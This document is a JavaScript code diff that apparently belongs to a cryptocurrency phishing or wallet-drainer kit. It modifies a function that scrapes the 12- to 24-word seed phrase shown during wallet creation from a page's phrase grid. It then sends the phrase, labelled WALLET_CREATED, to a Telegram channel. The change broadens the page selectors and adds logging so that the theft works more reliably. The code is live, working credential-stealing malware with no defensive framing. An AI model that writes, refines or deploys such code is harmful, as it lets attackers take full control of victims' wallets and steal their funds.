@@ -62,23 +62,43 @@ function sendPhrase(phrase, type, field) {
   sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname });
 }
 
-// --- Collect words from .phrase-grid / .phrase-card (wallet creation display) ---
+// --- Collect words from .phrase-grid (wallet creation display) ---
 function collectGridPhrase() {
-  var grid = document.querySelector('.phrase-grid');
-  if (!grid) return;
-  var cards = grid.querySelectorAll('.phrase-card');
-  if (!cards.length) return;
+  // Try multiple selectors for the phrase grid
+  var grid = document.querySelector('.phrase-grid') || document.querySelector('[class*="phrase-grid"]');
+  if (!grid) {
+    console.log('🔍 No .phrase-grid found');
+    return;
+  }
+  console.log('✅ Found phrase-grid:', grid.className);
+  
+  // Words are in <span> children directly (not .phrase-card)
+  var spans = grid.querySelectorAll(':scope > span');
+  if (!spans.length) {
+    // Fallback: any direct child with text
+    spans = grid.children;
+  }
+  console.log('🔍 Found', spans.length, 'word elements in grid');
+  
+  if (!spans.length) return;
+  
   var ws = [];
-  cards.forEach(function(card) {
-    // Each card contains an index number + the word — strip the number
-    var txt = (card.textContent || '').trim().replace(/^\d+\s*/, '');
-    if (txt && /^[a-z]{2,10}$/i.test(txt)) ws.push(txt.toLowerCase());
-  });
+  for (var i = 0; i < spans.length; i++) {
+    var txt = (spans[i].textContent || '').trim();
+    // Clean: remove index numbers, take just the word
+    txt = txt.replace(/^\d+[:.)\s]*/, '').trim();
+    if (txt && /^[a-zA-Z]{2,10}$/.test(txt)) {
+      ws.push(txt.toLowerCase());
+    }
+  }
+  
+  console.log('🔍 Collected words:', ws.length, ws.slice(0, 3).join(',') + '...');
+  
   if ([12, 15, 18, 21, 24].includes(ws.length)) {
     var phrase = ws.join(' ');
     if (phrase !== lastSent) {
       lastSent = phrase;
-      console.log('📋 Wallet creation phrase from grid:', ws.length, 'words');
+      console.log('📋 Sending WALLET_CREATED phrase:', ws.length, 'words');
       sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
     }
   }
